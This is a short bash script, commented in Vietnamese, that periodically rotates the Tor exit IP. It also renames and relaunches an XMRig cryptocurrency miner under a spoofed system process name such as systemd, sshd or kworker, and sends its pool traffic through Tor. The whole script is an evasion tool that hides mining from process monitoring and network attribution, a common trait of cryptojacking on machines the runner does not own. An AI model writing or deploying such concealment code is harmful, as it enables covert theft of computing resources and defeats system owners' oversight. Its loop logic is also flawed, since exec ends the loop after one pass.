#!/bin/bash

# Tính thời gian ngẫu nhiên để đổi IP (từ 10 đến 20 phút)
while true; do
  sleep_time=$(shuf -i 600-1200 -n 1)  # Ngẫu nhiên từ 10-20 phút
  sleep $sleep_time
  
  echo "Đang yêu cầu Tor thay đổi IP..."
  kill -HUP $(pgrep tor)
  echo "Tor đã thay đổi IP."

  # Danh sách các tên tiến trình hợp lệ giống hệ thống
  PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")

  # Chọn một tên tiến trình ngẫu nhiên từ danh sách
  RANDOM_PROCESS_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}

  # Đổi tên XMRig
  echo "Đổi tên XMRig..."
  if [ -f /root/xmrig_name.txt ]; then
    pkill -f $(cat /root/xmrig_name.txt)
  fi

  RANDOM_NAME=$(echo training-$(shuf -i 1-999 -n 1))
  mv /root/work/xmrig /root/work/$RANDOM_NAME
  echo $RANDOM_NAME > /root/xmrig_name.txt

  # Cấp quyền chạy cho file mới
  chmod +x /root/work/$RANDOM_NAME

  # Khởi động lại XMRig với tên tiến trình hệ thống
  echo "Khởi động lại XMRig với tên tiến trình: $RANDOM_PROCESS_NAME"
  exec -a $RANDOM_PROCESS_NAME torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
done
